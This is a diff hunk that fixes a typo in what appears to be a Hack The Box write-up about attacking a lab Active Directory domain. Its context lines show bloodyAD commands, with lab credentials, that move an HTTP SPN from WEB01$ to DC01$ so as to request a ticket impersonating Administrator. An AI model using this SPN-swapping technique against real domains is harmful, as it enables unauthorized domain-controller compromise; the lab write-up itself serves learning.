@@ -1479,7 +1479,7 @@ konoha# bloodyAD -d pirate.htb -u a.white_adm -p &#x27;P@ssw0rd123!&#x27; -H dc0
 
 Really this looks exciting, so essentially what we have is the ability to change the ServicePrincipalNames of any of the computer accounts ASWELL as the DC01$ machine. 
 Swapping SPNS and Impersonation Is Magic
-What we want to do is remove the spn HTTP/WEEB01.pirate.htb from WEB01$ and set it on DC01$, this will let us request a service ticket against this spn on DC01$. Though we will ask for an alternative service so the ticket will be good for both spn’s, while impersonating a user with higher privilege(Administrator). We can again use bloodyAD to achieve this.
+What we want to do is remove the spn HTTP/WEB01.pirate.htb from WEB01$ and set it on DC01$, this will let us request a service ticket against this spn on DC01$. Though we will ask for an alternative service so the ticket will be good for both spn’s, while impersonating a user with higher privilege(Administrator). We can again use bloodyAD to achieve this.
 (.impacket) konoha# bloodyAD -d pirate.htb -u a.white_adm -p P@ssw0rd123! -H dc01.pirate.htb msldap delspn &#x27;CN=WEB01,CN=COMPUTERS,DC=PIRATE,DC=HTB&#x27; &#x27;HTTP/WEB01.pirate.htb&#x27;SPN removed!(.impacket) konoha# bloodyAD -d pirate.htb -u a.white_adm -p P@ssw0rd123! -H dc01.pirate.htb msldap addspn &#x27;CN=DC01,OU=DOMAIN CONTROLLERS,DC=PIRATE,DC=HTB&#x27; &#x27;HTTP/WEB01.pirate.htb&#x27;SPN added!(.impacket) konoha#
 
 Requesting a service ticket with the set spn and alternative service set to cifs, while impersonating the Administrator.
